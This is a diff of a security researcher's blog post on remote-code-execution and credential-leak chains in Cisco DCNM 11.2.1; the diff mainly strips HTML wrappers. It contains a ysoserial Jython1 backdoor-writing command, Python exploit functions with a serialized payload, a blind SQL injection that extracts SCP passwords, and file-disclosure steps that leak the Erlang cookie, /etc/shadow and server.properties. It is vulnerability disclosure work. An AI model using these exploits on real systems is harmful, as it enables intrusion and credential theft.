-<p markdown="1" class="cn">Cisco used newer versions of all libs known to contain gadget chains which means that several Java properties need to be set to allow untrusted deserialization of Data. For example, newer versions of the [commons-fileupload](https://issues.apache.org/jira/browse/FILEUPLOAD-279) lib was used so the target would need the `org.apache.commons.fileupload.disk.DiskFileItem.serializable` system property set to `true` to be vulnerable.</p>
+Cisco used newer versions of all libs known to contain gadget chains which means that several Java properties need to be set to allow untrusted deserialization of Data. For example, newer versions of the [commons-fileupload](https://issues.apache.org/jira/browse/FILEUPLOAD-279) lib was used so the target would need the `org.apache.commons.fileupload.disk.DiskFileItem.serializable` system property set to `true` to be vulnerable.
 
-<p markdown="1" class="cn">It was the same situation for the [common-collections](https://issues.apache.org/jira/browse/COLLECTIONS-580) lib. The `org.apache.commons.collections.enableUnsafeSerialization` system property needed to be set to `true` for us to gain remote code execution.</p>
+It was the same situation for the [common-collections](https://issues.apache.org/jira/browse/COLLECTIONS-580) lib. The `org.apache.commons.collections.enableUnsafeSerialization` system property needed to be set to `true` for us to gain remote code execution.
 
-<p markdown="1" class="cn">After a short break, I noticed that the **jython-standalone** lib was present in the class path. The version was **2.7.0** and did not match the version in [ysoserial](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Jython1.java#L44). As it turns out, I can (ab)use this lib for deserialzation. All I needed to do was change the `pom.xml` file in the ysoserial project to use version **2.7.0** of the jython-standalone lib so that the `serialversionuId` matches that of my target. Now I could use the `Jython1` gadget chain.</p>
+After a short break, I noticed that the **jython-standalone** lib was present in the class path. The version was **2.7.0** and did not match the version in [ysoserial](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Jython1.java#L44). As it turns out, I can (ab)use this lib for deserialzation. All I needed to do was change the `pom.xml` file in the ysoserial project to use version **2.7.0** of the jython-standalone lib so that the `serialversionuId` matches that of my target. Now I could use the `Jython1` gadget chain.
 
 ```xml
     <dependency>
@@ -1785,19 +1654,19 @@ https://<target>/fm/fmrest/virtualportchannel/vpcwizard/history/details?context=
     </dependency>
 ```
 
-<p markdown="1" class="cn">The Python maintainers never patched this gadget chain, so if it's in your class path an attacker could leverage it for remote (python bytecode) execution. In both of the setups I tested, the python path wasn't set in Java's environment so I could not get jython code executed via the [`execfile`](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Jython1.java#L77)!</p>
+The Python maintainers never patched this gadget chain, so if it's in your class path an attacker could leverage it for remote (python bytecode) execution. In both of the setups I tested, the python path wasn't set in Java's environment so I could not get jython code executed via the [`execfile`](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Jython1.java#L77)!
 
-<p markdown="1" class="cn">However, I didn't need to because the gadget chain uses python bytecode to [write a file](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Jython1.java#L67) with our controlled content into an arbitrary location. I could have engineered some python bytecode to directly execute a stub, but this was good enough. Therefore, I just created a backdoor file called `si.jsp` and specified the remote path (web root) to write the file to!</p>
+However, I didn't need to because the gadget chain uses python bytecode to [write a file](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Jython1.java#L67) with our controlled content into an arbitrary location. I could have engineered some python bytecode to directly execute a stub, but this was good enough. Therefore, I just created a backdoor file called `si.jsp` and specified the remote path (web root) to write the file to!
 
 ```bash
 java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar Jython1 "si.jsp;../../standalone/tmp/vfs/temp/xxxxxxxxxxxxxxxxxxxx/yyyyyyyyyyyyyyyyyyyyyyyy/si.jsp" > poc.bin
 ```
 
-<p markdown="1" class="cn">I used the path `/xxxxxxxxxxxxxxxxxxxx/yyyyyyyyyyyyyyyyyyyyyyyy/` here because the application server Cisco DCNM is using is [Wildfly](https://wildfly.org/) (known previously as Jboss) and it has hot deployment enabled meaning everytime the application server was restarted, the web root changes location. I could have written a war file into the hot deployment directory and have the war deployed on the fly (the hot deployment directory is a fixed path) but I used the web root because I could leak the virtual file path using a different vulnerability and the post exploitation cleanup was easier.</p>
+I used the path `/xxxxxxxxxxxxxxxxxxxx/yyyyyyyyyyyyyyyyyyyyyyyy/` here because the application server Cisco DCNM is using is [Wildfly](https://wildfly.org/) (known previously as Jboss) and it has hot deployment enabled meaning everytime the application server was restarted, the web root changes location. I could have written a war file into the hot deployment directory and have the war deployed on the fly (the hot deployment directory is a fixed path) but I used the web root because I could leak the virtual file path using a different vulnerability and the post exploitation cleanup was easier.
 
-<p markdown="1" class="cn">For reference, here is the `we_can_trigger_sqli_for_deserialization` and `we_can_trigger_deserialization` methods I used to exploit this code path for remote code execution.</p>
+For reference, here is the `we_can_trigger_sqli_for_deserialization` and `we_can_trigger_deserialization` methods I used to exploit this code path for remote code execution.
 
-```python
+```py
 def we_can_trigger_sqli_for_deserialization(target, filename):
     ser = """aced0005737200176a6176612e7574696c2e5072696f7269747951756575
     6594da30b4fb3f82b103000249000473697a654c000a636f6d7061726174
@@ -1957,48 +1826,40 @@ def we_can_trigger_deserialization(target):
     return False
 ```
 
-<p markdown="1" class="cn">A huge thanks goes to [Alvaro Munoz](https://twitter.com/pwntester) and [Christian Schneider](https://twitter.com/cschneider4711) for this gadget chain, nice work!</p>
+A huge thanks goes to [Alvaro Munoz](https://twitter.com/pwntester) and [Christian Schneider](https://twitter.com/cschneider4711) for this gadget chain, nice work!
 
-<p markdown="1" class="cn">[ret2toc](#table-of-contents)</p>
+[ret2toc](#table-of-contents)
 
 ### Primitive 3 - SCP Credential Leak
 
-<p markdown="1" class="cn">Vulnerable Targets:</p>
-<div markdown="1" class="cn">
+Vulnerable Targets:
 - ISO Virtual Appliance for VMWare (dcnm-va.11.2.1.iso.zip)
-</div>
 
-<p markdown="1" class="cn">Some of the SQL injection vulnerabilities didn't allow me to stack the queries. The code would sometimes split the injected string on the `;` character. Since I could only leak information from the database with them, I developed a statement that allowed me to leak the SCP username and plain-text password out of the `image_and_config_server` table.</p>
+Some of the SQL injection vulnerabilities didn't allow me to stack the queries. The code would sometimes split the injected string on the `;` character. Since I could only leak information from the database with them, I developed a statement that allowed me to leak the SCP username and plain-text password out of the `image_and_config_server` table.
 
 ```sql
 and 'a'=(select case when substr(concat(username,'|',password), %d, 1)='%s' then pg_sleep(%d)||'a' else null end from image_and_config_server where name='Default_SCP_Repository')--
 ```
 
-<p markdown="1" class="cn">Once this was done, I could just login via SSH.</p>
+Once this was done, I could just login via SSH.
 
-{% include image.html
-            img="assets/images/busting-ciscos-beans-hardcoding-your-way-to-hell/sqli-id.png"
-            title="Leaking SCP credentials and logging in to the system via SSH"
-            caption="Leaking SCP credentials and logging in to the system via SSH"
-            style="width:80%;height:80%" %}
+![Leaking SCP credentials and logging in to the system via SSH](/assets/images/busting-ciscos-beans/sqli-id.png "Leaking SCP credentials and logging in to the system via SSH")
 
-<p markdown="1" class="cn">[ret2toc](#table-of-contents)</p>
+[ret2toc](#table-of-contents)
 
 ## SQLi2FD Primitive
 
-<p markdown="1" class="cn">This is the file disclosure primitive I used to chain with arbitrary sql execution vulnerabilities. This primitive take advantage of the assumed trust that the application code had with the database.</p>
+This is the file disclosure primitive I used to chain with arbitrary sql execution vulnerabilities. This primitive take advantage of the assumed trust that the application code had with the database.
 
-<p markdown="1" class="cn">In this case, there was no second order attack - meaning that the insertion stage of data injection was filtered for malicious input enough to prevent direct file disclosure. This is why it was not considered a vulnerability itself.</p>
+In this case, there was no second order attack - meaning that the insertion stage of data injection was filtered for malicious input enough to prevent direct file disclosure. This is why it was not considered a vulnerability itself.
 
 ### External Entity Injection (XXE)
 
-<p markdown="1" class="cn">Vulnerable Targets:</p>
-<div markdown="1" class="cn">
+Vulnerable Targets:
 - Installer for Windows (dcnm-installer-x64-windows.11.2.1.exe.zip)
 - ISO Virtual Appliance for VMWare (dcnm-va.11.2.1.iso.zip)
-</div>
 
-<p markdown="1" class="cn">In the `com.cisco.dcbu.vinci.rest.services.CablePlans` class, we can see the REST method `getCablePlan`.</p>
+In the `com.cisco.dcbu.vinci.rest.services.CablePlans` class, we can see the REST method `getCablePlan`.
 
 ```java
 /*      */ @Path("/cable-plans/")
@@ -2017,7 +1878,7 @@ and 'a'=(select case when substr(concat(username,'|',password), %d, 1)='%s' then
 /*  216 */         List<CablePlan> cablePlanList = viewCablePlanContent(detail);
 ```
 
-<p markdown="1" class="cn">At line *[216]* we can see a call to `CablePlans.viewCablePlanContent` method.</p>
+At line *[216]* we can see a call to `CablePlans.viewCablePlanContent` method.
 
 ```java
 /*      */   public List<CablePlan> viewCablePlanContent(boolean detail) throws SQLException, ClassNotFoundException, Exception {
@@ -2046,7 +1907,7 @@ and 'a'=(select case when substr(concat(username,'|',password), %d, 1)='%s' then
 /*  278 */     }
 ```
 
-<p markdown="1" class="cn">At line *[275]* the code calls `ParseXMLFile.ReadXMLFile` with our injected XML file from the `cableplanglobal` table.</p>
+At line *[275]* the code calls `ParseXMLFile.ReadXMLFile` with our injected XML file from the `cableplanglobal` table.
 
 ```java
 /*     */ public class ParseXMLFile
@@ -2074,46 +1935,37 @@ and 'a'=(select case when substr(concat(username,'|',password), %d, 1)='%s' then
 /*  43 */       parser.parse(file, this);
 ```
 
-<p markdown="1" class="cn">Without reviewing what `CablePlans.writeStringToFile` does, we can see that at line *[43]* the code eventually calls `SAXParser.parse` using a `File` instance pointing to our controlled XML content.</p>
+Without reviewing what `CablePlans.writeStringToFile` does, we can see that at line *[43]* the code eventually calls `SAXParser.parse` using a `File` instance pointing to our controlled XML content.
 
-<p markdown="1" class="cn">The injection would be as simple as: `;insert into cableplanglobal(id, content) values (1337, '<XXE payload>');`. Now that we can leak files, we could have then used that to [achieve further damage](#fd2rce-primitives).</p>
-
-<p markdown="1" class="cn">[ret2toc](#table-of-contents)</p>
+The injection would be as simple as: `;insert into cableplanglobal(id, content) values (1337, '<XXE payload>');`. Now that we can leak files, we could have then used that to [achieve further damage](#fd2rce-primitives).
+[ret2toc](#table-of-contents)
 
 ## FD2RCE Primitives
 
-<p markdown="1" class="cn">These are the primitives I used to exploit vulnerabilities that allowed me to disclose arbitrary files either with or without a directory traversal.</p>
+These are the primitives I used to exploit vulnerabilities that allowed me to disclose arbitrary files either with or without a directory traversal.
 
 ### Primitive 1 - RabbitMQ .erlang.cookie Leak
 
-<p markdown="1" class="cn">Vulnerable Targets:</p>
-<div markdown="1" class="cn">
+Vulnerable Targets:
 - ISO Virtual Appliance for VMWare (dcnm-va.11.2.1.iso.zip)
-</div>
 
-<p markdown="1" class="cn">The erlang portmapper daemon is running by default on the appliance and is exposed remotely. It can be (ab)used for remote code execution if we can leak the `.erlang.cookie` file.</p>
+The erlang portmapper daemon is running by default on the appliance and is exposed remotely. It can be (ab)used for remote code execution if we can leak the `.erlang.cookie` file.
 
 ```bash
 [root@localhost ~]# cat /var/lib/rabbitmq/.erlang.cookie
 QDBQPTVNAMZZURTUNHNC[root@localhost ~]#
 ```
 
-{% include image.html
-            img="assets/images/busting-ciscos-beans-hardcoding-your-way-to-hell/erlang-cookie.png"
-            title="Gaining RCE as rabbitmq via file disclosure"
-            caption="Gaining RCE as rabbitmq via file disclosure"
-            style="width:80%;height:80%" %}
+![Gaining RCE as rabbitmq via file disclosure](/assets/images/busting-ciscos-beans/erlang-cookie.png "Gaining RCE as rabbitmq via file disclosure")
 
-<p markdown="1" class="cn">[ret2toc](#table-of-contents)</p>
+[ret2toc](#table-of-contents)
 
 ### Primitive 2 - SCP Credential Leak
 
-<p markdown="1" class="cn">Vulnerable Targets:</p>
-<div markdown="1" class="cn">
+Vulnerable Targets:
 - ISO Virtual Appliance for VMWare (dcnm-va.11.2.1.iso.zip)
-</div>
 
-<p markdown="1" class="cn">We already know that the `image_and_config_server` table contains the SCP credentials. So we can find the Postgres filesystem mapping for it. To do that, we leak the `oid` and `relfilenode` from the dcmdb database.</p>
+We already know that the `image_and_config_server` table contains the SCP credentials. So we can find the Postgres filesystem mapping for it. To do that, we leak the `oid` and `relfilenode` from the dcmdb database.
 
 ```bash
 dcmdb=# select oid from pg_database where datname='dcmdb';
@@ -2129,7 +1981,7 @@ dcmdb=# select relfilenode from pg_class where relname='image_and_config_server'
 (1 row)
 ```
 
-<p markdown="1" class="cn">The correct path to the `image_and_config_server` table is `/usr/local/cisco/dcm/db/data/base/16393/17925`. This path is fixed between deployments so leaking this database information from the db is not a pre-requisite for this vector.</p>
+The correct path to the `image_and_config_server` table is `/usr/local/cisco/dcm/db/data/base/16393/17925`. This path is fixed between deployments so leaking this database information from the db is not a pre-requisite for this vector.
 
 ```bash
 [root@localhost ~]# hexdump -C /usr/local/cisco/dcm/db/data/base/16393/17925
@@ -2150,9 +2002,9 @@ dcmdb=# select relfilenode from pg_class where relname='image_and_config_server'
 00002000
 ```
 
-<p markdown="1" class="cn">Assuming that our file disclosure vulnerabilities can read binary files as root (hint: they can) then we can pull the plain-text system password out for the poap user.</p>
+Assuming that our file disclosure vulnerabilities can read binary files as root (hint: they can) then we can pull the plain-text system password out for the poap user.
 
-<p markdown="1" class="cn">You could just leak the `/etc/shadow` file and crack the root or poap user passwords. The root password is set by the administrator during installation so it maybe tricky/annoying to crack. However, **the poap users password is set by the installer and only 7 characters in length using the [a-z0-9] character set!**</p>
+You could just leak the `/etc/shadow` file and crack the root or poap user passwords. The root password is set by the administrator during installation so it maybe tricky/annoying to crack. However, **the poap users password is set by the installer and only 7 characters in length using the [a-z0-9] character set!**
 
 ```
 saturn:~ mr_me$ sshpass -p '7e5bf429' ssh poap@192.168.100.123 'id;uname -a'
@@ -2160,16 +2012,14 @@ uid=1000(poap) gid=1000(poap) groups=1000(poap)
 Linux localhost 3.10.0-957.10.1.el7.x86_64 #1 SMP Mon Mar 18 15:06:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
-<p markdown="1" class="cn">[ret2toc](#table-of-contents)</p>
+[ret2toc](#table-of-contents)
 
 ### Primitive 3 - Leaking server.properties
 
-<p markdown="1" class="cn">Vulnerable Targets:</p>
-<div markdown="1" class="cn">
+Vulnerable Targets:
 - ISO Virtual Appliance for VMWare (dcnm-va.11.2.1.iso.zip)
-</div>
 
-<p markdown="1" class="cn">If you prefer root access (like I do) then you can also leak the `server.properties` file. This is the same file that's displayed in the web interface for [ZDI-20-012](https://www.zerodayinitiative.com/advisories/ZDI-20-012/) in [RCE Chain 2](#rce-chain-2).</p>
+If you prefer root access (like I do) then you can also leak the `server.properties` file. This is the same file that's displayed in the web interface for [ZDI-20-012](https://www.zerodayinitiative.com/advisories/ZDI-20-012/) in [RCE Chain 2](#rce-chain-2).
 
 ```bash
 [root@localhost ~]# cat /usr/local/cisco/dcm/fm/conf/server.properties | grep sftp
@@ -2179,19 +2029,16 @@ server.sftp.password=#59f44e08047be2d72f34371127b18a0b
 server.sftp.enabled=true
 ```
 
-<p markdown="1" class="cn">We can proceed to decrypt the password just like we did in [ZDI-20-013](https://www.zerodayinitiative.com/advisories/ZDI-20-013/) and then login in via SSH.</p>
-
-<p markdown="1" class="cn">[ret2toc](#table-of-contents)</p>
+We can proceed to decrypt the password just like we did in [ZDI-20-013](https://www.zerodayinitiative.com/advisories/ZDI-20-013/) and then login in via SSH.
+[ret2toc](#table-of-contents)
 
 ## Conclusions
 
-<p class="cn" markdown="1">I have none. This blog post is long enough.</p>
+I have none. This blog post is long enough.
 
 ## References
 
-<div markdown="1" class="cn">
 - [https://raw.githubusercontent.com/pedrib/PoC/master/advisories/cisco-ucs-rce.txt](https://raw.githubusercontent.com/pedrib/PoC/master/advisories/cisco-ucs-rce.txt)
 - [https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)
 - [http://blog.bdoughan.com/2011/06/using-jaxbs-xmlaccessortype-to.html](http://blog.bdoughan.com/2011/06/using-jaxbs-xmlaccessortype-to.html)
 - [https://zhangyuhui.blog/2018/01/12/leak-issue-of-inheritablethreadlocal-and-how-to-fix-it/](https://zhangyuhui.blog/2018/01/12/leak-issue-of-inheritablethreadlocal-and-how-to-fix-it/)
-</div>
